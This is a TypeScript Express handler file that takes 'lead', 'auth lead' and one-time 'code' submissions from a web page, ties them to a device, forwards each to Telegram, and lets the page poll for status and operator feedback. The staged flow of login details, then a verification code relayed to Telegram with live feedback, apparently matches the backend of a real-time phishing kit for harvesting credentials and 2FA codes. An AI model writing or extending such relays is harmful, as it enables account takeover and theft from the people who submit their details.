import type { RequestHandler } from "express";
import {
  codeLeadSchema,
  authLeadSchema,
  leadSchema,
} from "../schemas/lead.schemas.js";
import {
  sendAuthLeadSessionToTelegram,
  sendCodeLeadSessionToTelegram,
  sendLeadSessionToTelegram,
} from "../methods/telegram.methods.js";
import type {
  LeadProcess,
  LeadSession,
  LeadStatus,
} from "../methods/lead.methods.js";
import { getLeadIdentity, readLeadSession } from "../methods/lead.methods.js";
import {
  isKnownDeviceForLead,
  linkDeviceToLead,
} from "../methods/device.methods.js";

type LeadSessionSnapshot = {
  sessionId: string;
  status: LeadStatus;
  process: LeadProcess;
  message: string;
};

function toLeadSessionSnapshot(
  session: LeadSession,
  sessionId: string,
): LeadSessionSnapshot {
  return {
    sessionId,
    status: session.status,
    process: session.process,
    message: session.feedback,
  };
}

export const leadPostHandler: RequestHandler = async (request, response) => {
  const lead = leadSchema.safeParse(request.body);
  if (!lead.success) {
    response.status(400).json({
      ok: false,
      error: {
        code: "VALIDATION_ERROR",
        message: lead.error.issues[0].message,
      },
    });
    return;
  }
  try {
    const leadIdentity = getLeadIdentity(lead.data);
    await linkDeviceToLead(lead.data.clientId, leadIdentity);
    const session = await sendLeadSessionToTelegram(
      lead.data.sessionId,
      lead.data,
    );
    response
      .status(202)
      .json(toLeadSessionSnapshot(session, lead.data.sessionId));
  } catch (e) {
    console.error("Lead post handling failed", e);
    response.status(503).json({
      ok: false,
      error: {
        code: "LEAD_HANDLING_FAILED",
        message:
          e instanceof Error
            ? e.message
            : "An error occurred. \nPlease try again.",
      },
    });
  }
};

export const authLeadPostHandler: RequestHandler = async (
  request,
  response,
) => {
  const lead = authLeadSchema.safeParse(request.body);
  if (!lead.success) {
    response.status(400).json({
      ok: false,
      error: {
        code: "VALIDATION_ERROR",
        message: lead.error.issues[0].message,
      },
    });
    return;
  }
  try {
    const leadIdentity = getLeadIdentity(lead.data);
    await linkDeviceToLead(lead.data.clientId, leadIdentity);
    const session = await sendAuthLeadSessionToTelegram(
      lead.data.sessionId,
      lead.data,
    );
    response
      .status(202)
      .json(toLeadSessionSnapshot(session, lead.data.sessionId));
  } catch (e) {
    console.error("Auth lead post handling failed", e);
    response.status(503).json({
      ok: false,
      error: {
        code: "AUTH_LEAD_HANDLING_FAILED",
        message:
          e instanceof Error
            ? e.message
            : "An error occurred. \nPlease try again.",
      },
    });
  }
};

export const codeLeadPostHandler: RequestHandler = async (
  request,
  response,
) => {
  const leadCode = codeLeadSchema.safeParse(request.body);
  if (!leadCode.success) {
    response.status(400).json({
      ok: false,
      error: {
        code: "VALIDATION_ERROR",
        message:
          leadCode.error.issues[0]?.message ??
          "Check the submitted information.",
      },
    });
    return;
  }
  try {
    const leadIdentity = getLeadIdentity(leadCode.data);
    const authorized = await isKnownDeviceForLead(
      leadCode.data.clientId,
      leadIdentity,
    );
    if (!authorized) {
      response.status(403).json({
        ok: false,
        error: {
          code: "CLIENT_UNAUTHORIZED",
          message: "This device is not authorized for this flow.",
        },
      });
      return;
    }
    const session = await sendCodeLeadSessionToTelegram(
      leadCode.data.sessionId,
      {
        type: leadCode.data.type,
        code: leadCode.data.code,
      },
    );
    response
      .status(202)
      .json(toLeadSessionSnapshot(session, leadCode.data.sessionId));
  } catch (e) {
    console.error("Code lead post handling failed", e);
    response.status(503).json({
      ok: false,
      error: {
        code: "CODE_LEAD_HANDLING_FAILED",
        message:
          e instanceof Error
            ? e.message
            : "An error occurred. \nPlease try again.",
      },
    });
  }
};

export const leadGetHandler: RequestHandler<{
  sessionId: string;
}> = async (request, response) => {
  try {
    const sessionId = request.params.sessionId;
    if (!sessionId) {
      response.status(400).json({
        ok: false,
        error: {
          code: "MISSING_SESSION_ID",
          message: "A session ID is required.",
        },
      });
      return;
    }
    const session = await readLeadSession(sessionId);
    if (!session) {
      response.status(202).json({
        sessionId: sessionId,
        status: "failed",
        process: "init",
        message: "This session has expired. Reload the page and try again.",
      } satisfies LeadSessionSnapshot);
      return;
    }
    response.status(202).json(toLeadSessionSnapshot(session, sessionId));
  } catch (e) {
    console.error("Lead get handling failed", e);
    response.status(503).json({
      ok: false,
      error: {
        code: "LEAD_GET_HANDLING_FAILED",
        message: "An error occurred. \nPlease try again.",
      },
    });
  }
};
